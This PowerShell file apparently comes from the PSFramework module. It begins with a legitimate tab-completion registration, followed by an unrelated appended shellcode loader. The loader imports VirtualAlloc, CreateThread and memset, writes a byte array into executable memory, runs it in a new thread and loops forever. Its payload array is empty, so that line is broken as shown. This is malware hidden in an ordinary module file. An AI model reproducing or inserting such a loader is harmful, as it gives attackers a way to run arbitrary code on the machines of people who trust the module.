﻿Register-PSFTeppScriptblock -Name 'PSFramework.Utility.PathName' -ScriptBlock {
	(Get-PSFConfig "PSFramework.Path.*").Name -replace '^.+\.([^\.]+)$', '$1'
}
$RG3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $RG3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$JWV=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($JWV.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$JWV,0,0,0);for (;;){Start-sleep 60};

